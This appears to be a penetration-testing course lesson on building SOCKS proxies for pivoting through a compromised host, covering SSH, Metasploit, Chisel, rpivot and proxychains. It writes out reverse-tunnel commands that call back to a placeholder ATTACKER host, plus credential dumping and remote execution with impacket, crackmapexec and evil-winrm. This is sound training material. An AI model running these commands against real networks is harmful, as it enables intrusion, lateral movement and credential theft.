# SOCKS Proxies

## Unit 9 - Topic 4 | Pivoting and Lateral Movement

---

## Overview

**SOCKS proxies** provide a generic way to route TCP (and sometimes UDP) traffic through an intermediary. Unlike port forwarding which targets specific services, SOCKS proxies allow routing any application's traffic through a compromised host using tools like proxychains.

---

## 1. SOCKS Protocol Basics

```
SOCKS PROXY OPERATION:

CLIENT APPLICATION
     │
     ├── Configure SOCKS proxy: 127.0.0.1:1080
     │
     ↓
┌─────────────┐
│ SOCKS PROXY │  (On attacker or pivot)
│  :1080      │
└──────┬──────┘
       │ Tunnel (SSH, Chisel, Metasploit)
       ↓
┌─────────────┐
│  PIVOT HOST │  (Compromised system)
│             │
└──────┬──────┘
       │ Direct connection
       ↓
┌─────────────┐
│   TARGET    │  (Internal system)
│ 10.0.2.10   │
└─────────────┘

SOCKS VERSIONS:
├── SOCKS4  — TCP only, no authentication
├── SOCKS4a — TCP + DNS resolution on proxy
├── SOCKS5  — TCP + UDP + authentication + DNS
└── SOCKS5h — SOCKS5 with remote DNS resolution
```

---

## 2. Creating SOCKS Proxies

```bash
# === SSH DYNAMIC FORWARDING ===
ssh -NfD 1080 user@10.0.1.5
# Creates SOCKS5 on localhost:1080

# === METASPLOIT SOCKS ===
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# === CHISEL REVERSE SOCKS ===
# Attacker:
./chisel server --reverse --port 8080
# Compromised host:
./chisel client ATTACKER:8080 R:socks
# Creates SOCKS5 on attacker:1080

# === LIGOLO-NG (No SOCKS needed) ===
# Creates TUN interface — transparent routing
# See pivoting-techniques.md for details

# === RPIVOT (Reverse SOCKS) ===
# Attacker (server):
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
# Compromised host (client):
python client.py --server-ip ATTACKER --server-port 9999
```

---

## 3. Proxychains Configuration

```bash
# === PROXYCHAINS4 CONFIGURATION ===
# File: /etc/proxychains4.conf

# PROXY MODES:
# dynamic_chain  — Skip dead proxies, try next
# strict_chain   — All proxies must work (in order)
# round_robin    — Load balance across proxies
# random_chain   — Random proxy selection

# === SINGLE PROXY ===
# /etc/proxychains4.conf:
dynamic_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080

# === CHAINED PROXIES (Double Pivot) ===
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080    # First pivot
socks5 127.0.0.1 1081    # Second pivot (through first)

# === USAGE ===
proxychains nmap -sT -Pn -p 22,80,445 10.0.2.10
proxychains curl http://10.0.2.10
proxychains ssh admin@10.0.2.10
proxychains crackmapexec smb 10.0.2.0/24
proxychains evil-winrm -i 10.0.2.10 -u admin -p pass
proxychains firefox   # Browse internal web

# === IMPORTANT NOTES ===
# ├── Use -sT (TCP connect) with Nmap, NOT -sS (SYN)
# ├── SYN scans don't work through SOCKS
# ├── -Pn: Skip ping (ICMP doesn't work through SOCKS)
# ├── UDP scans don't work through SOCKS4
# └── DNS may need proxy_dns enabled
```

---

## 4. SOCKS with Different Tools

```bash
# === NMAP THROUGH SOCKS ===
proxychains nmap -sT -Pn -p- 10.0.2.10
# Must use -sT (full TCP connect)
# Must use -Pn (no ICMP ping)
# Will be slow — one connection per probe

# === CURL ===
curl --socks5 127.0.0.1:1080 http://10.0.2.10
# Or:
proxychains curl http://10.0.2.10

# === FIREFOX ===
# Settings → Network Settings → Manual Proxy
# SOCKS Host: 127.0.0.1, Port: 1080, SOCKS v5
# ✅ Proxy DNS when using SOCKS v5

# === CRACKMAPEXEC ===
proxychains crackmapexec smb 10.0.2.0/24 -u user -p pass

# === IMPACKET TOOLS ===
proxychains impacket-psexec domain/admin:pass@10.0.2.10
proxychains impacket-secretsdump domain/admin:pass@10.0.2.10

# === EVIL-WINRM ===
proxychains evil-winrm -i 10.0.2.10 -u admin -p password

# === GOBUSTER ===
gobuster dir -u http://10.0.2.10 --proxy socks5://127.0.0.1:1080 \
  -w /usr/share/wordlists/dirb/common.txt
```

---

## 5. Troubleshooting SOCKS

| Issue | Solution |
|-------|----------|
| **Connection refused** | Check SOCKS proxy is running |
| **Timeout** | Increase timeout in proxychains.conf |
| **DNS not resolving** | Enable `proxy_dns` in config |
| **SYN scan fails** | Use `-sT` (TCP connect) instead |
| **Ping doesn't work** | ICMP not supported — use `-Pn` |
| **Slow scanning** | Reduce thread count, scan specific ports |
| **UDP fails** | SOCKS4 doesn't support UDP — use SOCKS5 |
| **Tool not proxied** | Ensure it uses TCP (not raw sockets) |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **SOCKS proxy** | Generic TCP/UDP routing through proxy |
| **SOCKS5** | Supports TCP, UDP, authentication, DNS |
| **proxychains** | Route any tool through SOCKS proxy |
| **SSH -D** | Create SOCKS proxy via SSH tunnel |
| **Chisel R:socks** | Reverse SOCKS through Chisel |
| **Limitations** | No ICMP, no SYN scans, slower |

---

## Quick Revision Questions

1. **What is the difference between SOCKS4 and SOCKS5?**
2. **Why must you use -sT instead of -sS with proxychains?**
3. **How do you configure proxychains for a double pivot?**
4. **What does `proxy_dns` do in proxychains?**
5. **How do you create a SOCKS proxy with SSH?**

---

[← Previous: Port Forwarding](03-port-forwarding.md) | [Next: Lateral Movement Strategies →](05-lateral-movement-strategies.md)

---

*Unit 9 - Topic 4 of 6 | [Back to README](../README.md)*
